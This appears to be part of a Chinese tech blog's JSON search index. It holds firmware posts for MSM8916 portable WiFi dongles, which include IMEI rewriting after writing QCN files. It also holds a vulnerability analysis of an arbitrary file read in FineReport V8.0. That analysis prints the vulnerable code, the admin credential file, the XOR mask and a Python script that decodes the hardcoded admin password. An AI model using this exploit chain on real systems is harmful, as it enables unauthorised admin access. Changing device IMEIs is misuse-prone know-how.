%}\n","tags":["高通","随身WIFI"]},{"title":"UFI001C_MB_01 硬件与固件","url":"/shizuku/040709.html","content":"\n# UFI001C_MB_01 硬件与固件\n\n## 硬件参数\n\n- **PCB: UFI001C_MB_01**\n- **EMCP: HYNIX H9TP32A4GDCCPR - KGM**\n- **SOC: MSM8916 1VV**\n- **MODEM: 5633L/WTR4905**\n- **WIFI: WCN3620**\n- **POWER: PM8916**\n\n---\n\n![](https://m.360buyimg.com/babel/jfs/t1/179945/30/27719/155086/62f2c50eE0466bd5d/57e8979049db800c.jpg)\n\n![](https://m.360buyimg.com/babel/jfs/t1/52958/6/20652/279979/62f2c544E654bb971/b5d61a46343c1059.jpg)\n\n![](https://m.360buyimg.com/babel/jfs/t1/42863/26/18302/226197/62f2c557Eacc664ac/62a79aa598722ae5.jpg)\n\n---\n\n## 系统固件\n\n{% note success no-icon %}\n\n**包含 `rawprogram0.xml` 可使用MiFlash刷入**\n\n**包含 `GPT` 分区表 可用于底层救砖**\n\n**下载地址: https://www.123pan.com/s/mh49-szfwv**\n\n**仅适用UFI001C设备**\n\n{% endnote %}\n\n### QCN文件\n\n{% note info no-icon %}\n\n**可使用星海工具或Miko刷入**\n\n**下载地址: https://www.123pan.com/s/mh49-Wzfwv**\n\n**仅适用UFI001C设备**\n\n{% endnote %}\n\n\n\n{% note warning %}\n\n**QCN只适用于丢失串号后补救 请务必在写入QCN后修改IMEI**\n\n{% endnote %}\n\n\n\n## END\n\n {% note danger no-icon %}\n\n**请务必在进行任何操作之前, 备份设备固件 & QCN**！\n\n{% endnote %}\n\n\n\n{% note info no-icon %}\n\n**请务必在进行任何操作之前, 备份设备固件 & QCN**！\n\n{% endnote %}\n\n\n\n{% note success no-icon %}\n\n**请务必在进行任何操作之前, 备份设备固件 & QCN**！\n\n{% endnote %}\n","tags":["高通","随身WIFI"]},{"title":"UFI001B_MB_ET 硬件与固件","url":"/shizuku/042422.html","content":"\n# UFI001B_MB_ET 硬件与固件\n\n## 硬件参数\n\n- **PCB: UFI001B_MB_ET**\n- **EMCP: HYNIX H9TP32A4GDCCPR - KGM**\n- **SOC: MSM8916 1VV**\n- **MODEM: OM8443-20/WTR4905**\n- **WIFI: WCN3620**\n- **POWER: PM8916**\n\n---\n\n![](https://m.360buyimg.com/babel/jfs/t1/111810/8/29506/139159/62f2c44eEd5d5ca5b/03db1fbc1d502128.jpg)\n\n![](https://m.360buyimg.com/babel/jfs/t1/92924/23/30698/467745/62f2c4d5Ef175ef6b/3eb0d29c5392dd7b.jpg)\n\n![](https://m.360buyimg.com/babel/jfs/t1/179406/30/27883/516558/62f2c4f0E4dda416b/84a8aae77b4d9f0a.jpg)\n\n---\n\n## 系统固件\n\n{% note success no-icon %}\n\n**包含 `rawprogram0.xml` 可使用MiFlash刷入**\n\n**包含 `GPT` 分区表 可用于底层救砖**\n\n**下载地址: https://www.123pan.com/s/mh49-nzfwv**\n\n**仅适用UFI001B_MB_ET设备**\n\n{% endnote %}\n\n### QCN文件\n\n{% note info no-icon %}\n\n**可使用星海工具或Miko刷入**\n\n**下载地址: https://www.123pan.com/s/mh49-2zfwv**\n\n**仅适用UFI001B_MB_ET设备**\n\n{% endnote %}\n\n\n\n{% note warning %}\n\n**QCN只适用于丢失串号后补救 请务必在写入QCN后修改IMEI**\n\n{% endnote %}\n\n\n\n## END\n\n {% note danger no-icon %}\n\n**请务必在进行任何操作之前, 备份设备固件 & QCN**！\n\n{% endnote %}\n\n\n\n{% note info no-icon %}\n\n**请务必在进行任何操作之前, 备份设备固件 & QCN**！\n\n{% endnote %}\n\n\n\n{% note success no-icon %}\n\n**请务必在进行任何操作之前, 备份设备固件 & QCN**！\n\n{% endnote %}\n\n","tags":["高通","随身WIFI"]},{"title":"华乐天/1000G Debian系统","url":"/shizuku/042608.html","content":"\n# 华乐天/1000G Debian系统\n\n## 设备照片\n\n![](https://m.360buyimg.com/babel/jfs/t1/30700/14/16879/86827/62f2c338E6897c18d/c3e2f440a8144061.jpg)\n\n![1650792601157](https://m.360buyimg.com/babel/jfs/t1/50190/11/20719/342052/62f2c357E1eaa263e/65ec1b0f6e106bc6.jpg)\n\n![1650792601197](https://m.360buyimg.com/babel/jfs/t1/63320/12/21277/322845/62f2c369E2668d91b/29b0ead35ab4b7d7.jpg)\n\n## 设备参数\n\n- **MSM8916 Cortex-A53**\n\n- **512M+4G EMCP eMMC 5.1**\n- **USB2.0 标准尺寸SIM卡**\n\n\n--------------\n\n\n## 固件备份\n\n{% note info %}\n\n**此设备 默认未开启ADB功能 需要去WEB后台点击恢复出厂设置 即可开启ADB**\n\n{% endnote %}\n\n{% note warning %}\n\n**使用星海工具等 备份QCN 读IMEI/MEID 保存备用 一定要备份!!**\n\n{% endnote %}\n\n**命令进入9008模式**\n\n```shell\nadb reboot edl\n```\n\n{% note warning %}\n\n**使用Miko工具 读出设备的全固件留作备份 一定要备份!**\n\n{% endnote %}\n\n---\n\n## 刷写基带\n\n**备份完成后 进入BootLoader默认 选择星海工具的擦除基带**\n\n![image-20220424190432573](https://m.360buyimg.com/babel/jfs/t1/14234/17/18061/8690/62f2c37aE21d627d5/e936a3ce42e5839f.png)\n\n**下载附件的QCN保存到电脑 写入QCN**\n\n**因为RNDIS会影响DIAG端口 可能会出现QCN写入一半RNDIS启动 导致写入不完整**\n\n{% note info%}\n\n**需要写2次QCN！记得写完之后 写入你之前的IMEI/MEID**\n\n{% endnote %}\n\n**接着依次插入 移动 联通 电信Sim卡 检查是否可以正常获取IP**\n\n----\n\n## 刷写固件\n\n确定设备正常后 命令\n\n```shell\nadb reboot bootloader\n```\n\n使用附件的Flash.bat 刷入系统\n\n![](https://HelloDNS.coding.net/p/Blog/d/Blog/git/raw/master/202204241916297.png)\n\n{% note warning %}\n\n**打包的时候忘记注意字符编码问题 一些设备执行脚本 中文会乱码 可以参考bat内容对照**\n\n{% endnote %}\n\n**设备启动后可以看到设备管理器多出一个ADB设备 和 RNDIS**\n\n{% note warning %}\n\n**如果 RNDIS 感叹号 提示驱动问题 请参考**https://www.kancloud.cn/handsomehacker/openstick/2636506\n\n{% endnote %}\n\n### 基带推送\n\n![image-20220424193349481](https://m.360buyimg.com/babel/jfs/t1/67989/6/21306/30270/62f2c389E7ccb4897/6c758d49d4acce7b.png)\n\n**使用诸如WinSCP XFTP 或者SCP命令 将基带文件推送到 /tmp目录后 再移动到/lib/firmware**\n\n{% note info %}\n\n**推送完成后 请重启设备！**\n\n{% endnote %}\n\n----\n\n## Debian固件\n\n**基于开源项目OpenStick-Linux源码编译**\n\n- **Debian 11 Bullseye ARM64**\n- **默认为root登录 密码`1234567890`**\n- **更换为阿里云APT源 修改系统语言为中文(UTF-8)**\n- **修正时区为Asia/Shanghai 增加nano编辑器**\n- **提供curl wget lsusb fdisk nslookup功能**\n- **内置DNS为 Dndpod(119.29.29.29)**\n- **增加RT8152B有线网卡驱动(配合拓展坞)**\n- **恢复rc.local开机启动功能**\n\n---\n\n## 下载地址\n\n{% note success no-icon %}\n\n**固件下载地址:**  https://www.123pan.com/s/mh49-mzfwv **提取码: w001**\n\n{% endnote %}\n\n{% note success no-icon %}\n\n**QCN下载地址:**  https://www.123pan.com/s/mh49-wzfwv\n\n{% endnote %}\n","tags":["高通","随身WIFI","Debian"]},{"title":"帆软报表 V8.0 任意文件读取漏洞","url":"/shizuku/045635.html","content":"\n# 帆软报表 V8.0 任意文件读取漏洞\n\n## 漏洞分析\n\n```java\npackage com.fr.chart.web;\n\nimport com.fr.base.FRContext;\nimport com.fr.general.IOUtils;\nimport com.fr.stable.CodeUtils;\nimport com.fr.web.core.ActionNoSessionCMD;\nimport com.fr.web.utils.WebUtils;\nimport java.io.InputStream;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class ChartGetFileContentAction extends ActionNoSessionCMD {\n    public ChartGetFileContentAction() {\n    }\n\n    public void actionCMD(HttpServletRequest var1, HttpServletResponse var2, String var3) throws Exception {\n        String var4 = CodeUtils.cjkDecode(WebUtils.getHTTPRequestParameter(var1, \"resourcepath\"));\n        if (!WebUtils.invalidResourcePath(var4)) {\n            InputStream var5 = FRContext.getCurrentEnv().readResource(var4);\n            String var6 = IOUtils.inputStream2String(var5);\n            var6 = var6.replace('\\ufeff', ' ');\n            WebUtils.printAsString(var2, var6);\n        }\n    }\n\n    public String getCMD() {\n        return \"get_geo_json\";\n    }\n}\n```\n\n**使用request将文件名传入 调用cjkDecode函数解密文件名**\n\n**使用invalidResourcePath函数校验文件是否存在**\n\n**最后使用readResource函数读取文件传输到浏览器上 默认目录为resources**\n\n{% note orange 'fas fa-magic' %}\n\n这里就造成了一个任意文件读取的问题\n\n{% endnote %}\n\n让我们看看resources目录下有啥文件呢?\n\n![img](https://m.360buyimg.com/babel/jfs/t1/74608/32/21468/21284/62f2c181Eb0273651/4185c49f761e15af.png)\n\n**其中的privilege.xml里面存储了后台的用户名密码**\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<PrivilegeManager xmlVersion=\"20170715\" releaseVersion=\"8.0.0\" fsSystemManagerPassSet=\"true\" male=\"false\">\n<rootManagerName>\n<![CDATA[admin]]></rootManagerName>\n<rootManagerPassword>\n<![CDATA[___0072002a00670066000a]]></rootManagerPassword>\n<AP class=\"com.fr.privilege.providers.NoAuthenticationProvider\"/>\n<ForwardUrl>\n<![CDATA[${servletURL}?op=fr_platform]]></ForwardUrl>\n</PrivilegeManager>\n```\n\n## 密文解密\n\n**可以看到密码是加密存储的** \n\n**来看一下帆软系统的加密算法**\n\n### 加密函数\n\n```java\t\n //加密函数\npublic static String passwordEncode(String var0) {\n        StringBuilder var1 = new StringBuilder();\n        var1.append(\"___\");\n        if (var0 == null) {\n            return var1.toString();\n        } else {\n            int var2 = 0;\n\n            for(int var3 = 0; var3 < var0.length(); ++var3) {\n                if (var2 == PASSWORD_MASK_ARRAY.length) {\n                    var2 = 0;\n                }\n\n                int var4 = var0.charAt(var3) ^ PASSWORD_MASK_ARRAY[var2];\n                String var5 = Integer.toHexString(var4);\n                int var6 = var5.length();\n\n                for(int var7 = 0; var7 < 4 - var6; ++var7) {\n                    var5 = \"0\" + var5;\n                }\n\n                var1.append(var5);\n                ++var2;\n            }\n\n            return var1.toString();\n        }\n    }\n```\n\n### 解密函数\n\n```java\n\t//解密函数\n  public static String passwordDecode(String var0) {\n        if (var0 != null && var0.startsWith(\"___\")) {\n            var0 = var0.substring(3);\n            StringBuilder var1 = new StringBuilder();\n            int var2 = 0;\n\n            for(int var3 = 0; var3 <= var0.length() - 4; var3 += 4) {\n                if (var2 == PASSWORD_MASK_ARRAY.length) {\n                    var2 = 0;\n                }\n\n                String var4 = var0.substring(var3, var3 + 4);\n                int var5 = Integer.parseInt(var4, 16) ^ PASSWORD_MASK_ARRAY[var2];\n                var1.append((char)var5);\n                ++var2;\n            }\n\n            var0 = var1.toString();\n        }\n\n        return var0;\n    }\n```\n\n### 解密算法\n\n```python\ncipher = '___0072002a00670066000a' #密文\nPASSWORD_MASK_ARRAY = [19, 78, 10, 15, 100, 213, 43, 23] #掩码\nPassword = \"\"\ncipher = cipher[3:] #截断三位后\nfor i in range(int(len(cipher) / 4)):\n    c1 = int(\"0x\" + cipher[i * 4:(i + 1) * 4], 16)\n    c2 = c1 ^ PASSWORD_MASK_ARRAY[i % 8]\n    Password = Password + chr(c2)\nprint (Password)\n```\n\n![](https://m.360buyimg.com/babel/jfs/t1/198288/39/26275/49848/62f2c192Ef75ce07e/bdcee2c2ad080d54.png)\n\n{% note success no-icon %} \n\n任意文件读取漏洞实属没有严格规范参数传入\n\n但是后台密码使用硬编码模式...这就说不过去了\n\n{% endnote %}\n\n","tags":["帆软","漏洞","POC"]}]